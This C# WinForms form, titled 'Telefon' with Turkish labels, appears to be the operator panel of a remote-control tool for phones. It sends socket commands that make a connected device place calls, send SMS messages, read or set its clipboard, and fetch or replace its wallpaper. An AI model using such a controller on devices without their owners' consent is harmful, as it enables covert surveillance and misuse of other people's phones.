using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Telefon : Form
    {
        Socket sck;
        public string uniq_id = "";
        public Telefon(Socket sock, string uniq_id_)
        {
            InitializeComponent();
            uniq_id = uniq_id_;
            sck = sock;
            foreach(Control cntrl in tabPage1.Controls)
            {
                if(cntrl is Button)
                {
                    if (cntrl.Text != "1" && cntrl.Text != "<=" && cntrl.Text != "Ara")
                    {
                        cntrl.Click += new EventHandler(button1_Click);
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text += ((Button)sender).Text;
            say++;
        }
        int say = 0;
        private void button13_Click(object sender, EventArgs e)
        {
            if(textBox1.Text.Length > 0)
            {
                say--;
                textBox1.Text = textBox1.Text.Substring(0, say);
                
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if(textBox1.Text != "")
            {
                try { 
                byte[] polat_alemdar = Encoding.UTF8.GetBytes("ARA|" + textBox1.Text);
                Gonderici.Send(sck, polat_alemdar, 0, polat_alemdar.Length, 59999);
                }
                catch (Exception) { }
            }
        }

        private void button15_Click(object sender, EventArgs e)
        {
            if (textBox2.Text != "" && textBox3.Text != "")
            {
                try { 
                byte[] polat_alemdar = Encoding.UTF8.GetBytes("SMSGONDER|" + textBox2.Text + "=" + textBox3.Text + "=");
                Gonderici.Send(sck, polat_alemdar, 0, polat_alemdar.Length, 59999);
                }
                catch (Exception) { }
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            if(textBox4.Text != "")
            {
                try { 
                byte[] polat_alemdar = Encoding.UTF8.GetBytes("PANOSET|" + textBox4.Text);
                Gonderici.Send(sck, polat_alemdar, 0, polat_alemdar.Length, 59999);
                }
                catch (Exception) { }
            }
        }

        private void button17_Click(object sender, EventArgs e)
        {
            try { 
            byte[] polat_alemdar = Encoding.UTF8.GetBytes("PANOGET|");
            Gonderici.Send(sck, polat_alemdar, 0, polat_alemdar.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button19_Click(object sender, EventArgs e)
        {
            try { 
            byte[] polat_alemdar = Encoding.UTF8.GetBytes("WALLPAPERGET|");
            Gonderici.Send(sck, polat_alemdar, 0, polat_alemdar.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button20_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            {
                Multiselect = false,
                Filter = "Tüm dosyalar|*.png; *.jpg; *.jpeg",
                Title = "Karşıya yüklemek için bir dosya seçiniz.."
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    try { 
                    byte[] dosya_byte = Encoding.UTF8.GetBytes("WALLPAPERBYTE|" + File.ReadAllBytes(op.FileName).Length.ToString());
                    Gonderici.Send(sck, dosya_byte, 0, dosya_byte.Length, 59999);
                    Gonderici.Send(sck, File.ReadAllBytes(op.FileName), 0, File.ReadAllBytes(op.FileName).Length, 59999);
                    }
                    catch (Exception) { }
                }
            }
        }

        private void button18_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sv = new SaveFileDialog()
            {
                Filter = "Resim dosyası|*.png", Title = "Duvar kağıdını kaydedin",FileName = "duvar_kagidi.png"
            })
            {
                if (sv.ShowDialog() == DialogResult.OK)
                {
                    if(pictureBox1.Image != null)
                    pictureBox1.Image.Save(sv.FileName, ImageFormat.Png);
                }
            };
        }
    }
}
